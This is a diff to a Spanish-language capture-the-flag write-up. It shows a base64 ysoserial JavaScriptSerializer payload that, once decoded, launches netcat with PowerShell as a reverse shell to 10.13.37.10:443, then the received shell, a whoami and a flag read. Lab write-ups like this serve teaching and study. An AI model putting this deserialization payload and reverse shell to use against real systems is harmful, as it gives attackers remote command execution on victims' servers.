@@ -276,3 +276,19 @@ pc1@windows C:\CTF\ysoserial> .\ysoserial.exe -f JavaScriptSerializer -o base64 
 ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFByb2dyYW1EYXRhXFxuZXRjYXQuZXhlIC1lIHBvd2Vyc2hlbGwgMTAuMTMuMTQuMTAgNDQzJw0KICAgICAgICB9DQogICAgfQ0KfQ==
 pc1@Windows C:\CTF\ysoserial>
 ```
+
+Cambiamos la cookie y al recargar esta vez nos llega una shell y ya podemos ver otra FLAG: `CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}`
+
+```
+❯ sudo netcat -lvnp 443
+
+Listening on 0.0.0.0 443
+Connection received on 10.13.37.12
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\system32> whoami
+teignton\web_user
+PS C:\Windows\system32> type C:\Users\Public\flag.txt
+CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}
+PS C:\Windows\system32>
+```
